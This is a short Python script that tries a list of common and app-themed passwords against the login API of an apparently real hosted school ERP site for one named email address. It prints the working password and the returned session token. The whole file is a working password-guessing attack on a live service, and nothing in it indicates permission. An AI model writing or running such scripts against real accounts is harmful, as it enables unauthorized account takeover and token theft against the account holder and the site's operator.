import urllib.request
import json

def test_login(email, password):
    url = "https://edusphere-erp-frontend.onrender.com/api/v1/auth/login"
    data = json.dumps({"email": email, "password": password}).encode('utf-8')
    req = urllib.request.Request(
        url, data=data, 
        headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as res:
            if res.getcode() == 200:
                body = json.loads(res.read().decode('utf-8'))
                return True, body
    except Exception as e:
        pass
    return False, None

def main():
    passwords = ["Student@2024", "edusphere", "Student@123", "password", "student", "123456", "edusphere123", "Student"]
    email = "eduspherestudent@gmail.com"
    for pw in passwords:
        success, body = test_login(email, pw)
        if success:
            print(f"SUCCESS: password is '{pw}'")
            print("Token:", body.get('token'))
            return
    print("Failed to find password.")

if __name__ == "__main__":
    main()
